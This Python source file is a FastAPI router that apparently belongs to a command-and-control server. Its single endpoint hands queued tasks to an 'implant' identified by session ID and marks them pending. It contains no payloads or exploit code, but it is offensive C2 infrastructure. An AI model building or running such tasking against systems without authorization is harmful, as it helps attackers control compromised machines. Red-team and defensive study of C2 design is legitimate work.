import base64
import binascii
from datetime import datetime, timezone
from fastapi import APIRouter, FastAPI, HTTPException, status, Depends, Security
from fastapi.responses import RedirectResponse
from fastapi.security import OAuth2PasswordBearer
from jose import JWTError, jwt
from typing import Optional, List

# CORRECT imports when you're inside the 'server' package
from server_helper.user_helper import Users, UserRead, UserCreate, UserDelete
from server_helper.auth_helper import oauth2_scheme, verify_token
from server_helper.db import get_db, SessionLocal

from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead
from server_helper.tasking_helper import (
    Tasking,
    TaskingCreate,
    TaskingRead,
    TaskingDelete,
)
from server_helper.results_helper import (
    Results,
    ResultsCreate,
    ResultsRead,
    ResultsDelete,
)

router = APIRouter(prefix="/tasks", tags=["tasks"])

# endpoint for agent to retrieve tasks, mark them as pending after agent picks them up
@router.get("/{session}", response_model=List[TaskingRead])
def get_tasks(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")

    tasking = (
        db.query(Tasking)
        .filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending"]))
        .all()
    )
    if not tasking:
        raise HTTPException(status_code=404, detail="No tasks found for this session")
    # Mark tasks as pending
    for task in tasking:
        # implant picked it up for action
        task.complete = "Pending"
        db.commit()
        db.refresh(task)

    return tasking